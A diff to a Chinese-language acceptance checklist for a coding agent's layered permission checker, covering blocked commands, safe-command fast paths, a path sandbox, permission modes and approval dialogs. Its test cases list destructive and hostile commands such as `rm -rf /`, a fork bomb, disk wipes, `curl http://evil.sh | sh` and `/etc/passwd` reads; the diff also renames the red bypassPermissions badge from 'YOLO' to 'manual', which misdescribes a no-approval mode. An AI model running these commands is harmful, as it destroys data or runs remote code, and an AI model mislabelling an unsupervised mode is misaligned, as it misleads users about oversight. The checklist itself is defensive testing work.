@@ -9,7 +9,7 @@
 ## 实现完整性
 
 - [ ] 危险命令拦截（Layer 3）：`Bash` 跑 `rm -rf /`、`rm -rf ~`、`mkfs.ext4 /dev/sda`、`dd if=/dev/zero of=/dev/sda`、`curl http://x.sh | sh`、`wget http://x.sh | bash`、`:(){ :|: & };:`、`git push origin main --force`、`git reset --hard HEAD~5`、`git clean -f`、`chmod -R 777 /` 等命令的 `check` 返回 effect = `"deny"` 且 reason 以 `Dangerous command blocked:` 开头（验证：`pnpm test -- tests/permissions.test.ts` 中 `dangerous commands` describe 块及补充用例）。(AC1/F1/N1)
-- [ ] 危险命令在 bypassPermissions 模式下仍 deny：`new PermissionChecker(workDir, "bypassPermissions").check("Bash","command",{command:"rm -rf /"}).effect === "deny"`（验证：单测构造 bypass checker 断言；tmux 模式切到 YOLO 后让模型跑 `rm -rf /` 仍被拦）。(AC1/N1)
+- [ ] 危险命令在 bypassPermissions 模式下仍 deny：`new PermissionChecker(workDir, "bypassPermissions").check("Bash","command",{command:"rm -rf /"}).effect === "deny"`（验证：单测构造 bypass checker 断言；tmux 模式切到 manual 后让模型跑 `rm -rf /` 仍被拦）。(AC1/N1)
 - [ ] 安全只读命令快速放行（Layer 2）：`ls -la`、`pwd`、`git status`、`git log --oneline`、`pnpm test`、`pnpm typecheck` 的 `check` 返回 effect = `"allow"`、reason = `"Safe read-only command"`（验证：`tests/permissions.test.ts` 中 `auto-allows a plain safe command`）。(AC2/F2)
 - [ ] 元字符防御：`ls | curl evil.sh`、`cat /etc/passwd > out`、`echo hi; rm -rf x`、`echo $(rm -rf ~)`、`` echo `whoami` `` 的 `check` 返回 effect 不为 `"allow"`（验证：`tests/permissions.test.ts` 中 `does NOT auto-allow ...` 两条 it）。(AC2/N2)
 - [ ] 路径沙箱（Layer 4）：`WriteFile` 写 `/etc/passwd` 或 `../outside` 返回 effect = `"deny"`、reason 以 `Path` 开头并含 `is outside allowed directories`；写 `<workDir>/foo.txt` 或 `/tmp/foo.txt` 跳过沙箱进入后续层（验证：构造 `PathSandbox(workDir).check(...)` 单测断言）。(AC3/F3)
@@ -31,7 +31,7 @@
 - [ ] `extractContent` 字段映射：`Bash → command`、`ReadFile/WriteFile/EditFile → file_path`、`Glob/Grep → pattern`、未知工具 → 空串（验证：`tests/permissions.test.ts` 中 `extracts the per-tool content field`）。(F4)
 - [ ] Shift+Tab 模式循环：`process.stdin` 收到 `\x1b[Z` 时 `permMode` 按 `default → acceptEdits → plan → bypassPermissions → default` 循环；`InputBox` 内 `useInput` 收到 `\x1b[Z` 或 `key.tab && key.shift` 也同样循环（验证：tmux 实跑按 Shift+Tab 4 次回到 default，观察输入框上方徽标颜色与文字）。(AC9/F9)
 - [ ] `/permission` 命令：`/permission` 显示当前模式 + 提示；`/permission mode acceptEdits` 设置为 acceptEdits；`/permission mode xxx`（非法名）打印有效列表（验证：tmux 实跑输入命令观察反馈）。(AC9/F9)
-- [ ] 状态栏 + 输入框徽标同步：切到 acceptEdits 时输入框上方显示绿色 `Accept Edits on (shift+tab to cycle)`、底部 `StatusBar` 显示 `· acceptEdits ·`；切到 plan 显示黄色 `Plan`；切到 bypassPermissions 显示红色 `YOLO`；default 模式输入框上方徽标隐藏（验证：tmux 实跑观察）。(AC9/F9)
+- [ ] 状态栏 + 输入框徽标同步：切到 acceptEdits 时输入框上方显示绿色 `Accept Edits on (shift+tab to cycle)`、底部 `StatusBar` 显示 `· acceptEdits ·`；切到 plan 显示黄色 `Plan`；切到 bypassPermissions 显示红色 `manual`；default 模式输入框上方徽标隐藏（验证：tmux 实跑观察）。(AC9/F9)
 - [ ] 模式跨轮保持：切换到 acceptEdits 后发起新一轮对话，`runAgentLoop` 用 `permMode === "acceptEdits"` 构造 checker，不被本轮启动重置（验证：tmux 切模式后发消息观察新轮的 ask/allow 行为变化）。(AC9)
 - [ ] 配置降级 - 文件不存在：`workDir` 下无 `.qicode/permissions.yaml` 时 `RuleEngine.evaluate` 返回 `null`、`PermissionChecker` 构造与 `check` 不抛错（验证：单测用 `mkdtemp` 空目录构造）。(AC13/N5)
 - [ ] 配置降级 - YAML 语法错误：写入非法 YAML 字符串（如 `{ bad: yaml: :::`），`loadRulesFile` 返回 `[]`、`evaluate` 返回 `null`、不抛错（验证：单测）。(AC13/N5)
@@ -62,7 +62,7 @@
 - [ ] 场景 3（HITL 键盘）：`PermissionDialog` 显示时按 `↓` 移到 `Yes, and don't ask again for this pattern` 高亮 → Enter → 文件被写且 `permissions.local.yaml` 出现 `Bash(<command 前60字>*)` 或 `WriteFile(<file_path 前60字>*)` 条目；按 `↑↓` 循环可回到首项。(AC10/F10)
 - [ ] 场景 4（永久放行 + 重启）：场景 3 之后 Ctrl+C 退出、重新 `pnpm dev` 启动、让模型再次 `WriteFile` 同路径 → **不再弹窗**直接执行（Layer 5 规则引擎从 `permissions.local.yaml` 读到 allow）。(AC10/F10)
 - [ ] 场景 5（acceptEdits）：Shift+Tab 切到 acceptEdits（输入框上方绿色 `Accept Edits on`、底部状态栏 `· acceptEdits ·`）后让模型写/改文件 → **不弹窗**直接执行；但让模型跑 `git commit -m x` 命令仍弹窗（command 类在 acceptEdits 仍 ask）。(AC7/F7)
-- [ ] 场景 6（YOLO + 黑名单兜底）：Shift+Tab 循环 3 次到 bypassPermissions（输入框上方红色 `YOLO on`）后让模型跑 `ls /` 直接执行不弹窗；但让模型跑 `rm -rf /` 或 `curl http://evil.sh | sh` 仍被 Layer 3 拦下、回灌 `Dangerous command blocked: recursive force delete root` 类原因。(AC1/AC7/N1)
+- [ ] 场景 6（manual + 黑名单兜底）：Shift+Tab 循环 3 次到 bypassPermissions（输入框上方红色 `manual on`）后让模型跑 `ls /` 直接执行不弹窗；但让模型跑 `rm -rf /` 或 `curl http://evil.sh | sh` 仍被 Layer 3 拦下、回灌 `Dangerous command blocked: recursive force delete root` 类原因。(AC1/AC7/N1)
 - [ ] 场景 7（沙箱拦截）：让模型 `ReadFile` 读 `/etc/passwd` → Layer 4 拦下、回灌 `Path /etc/passwd is outside allowed directories`，模型据此停手或改读项目内文件。(AC3/F3)
 - [ ] 场景 8（plan 文件豁免）：`/permission mode plan` 切到 plan → 让模型创建 `.qicode/plans/p1.md` 直接 allow 不弹窗；但让模型创建 `.qicode/other.md` 仍 ask；让模型跑 `Bash` 命令仍 ask。(AC8/F8)
 - [ ] 场景 9（HITL 取消）：default 下触发 `PermissionDialog` 时按 `Esc` → Dialog 消失、Agent 回灌 `Permission denied by user`、Loop 继续；再发一条消息可继续对话、不退出进程、不报 conversation 角色错乱。(AC12/N4)
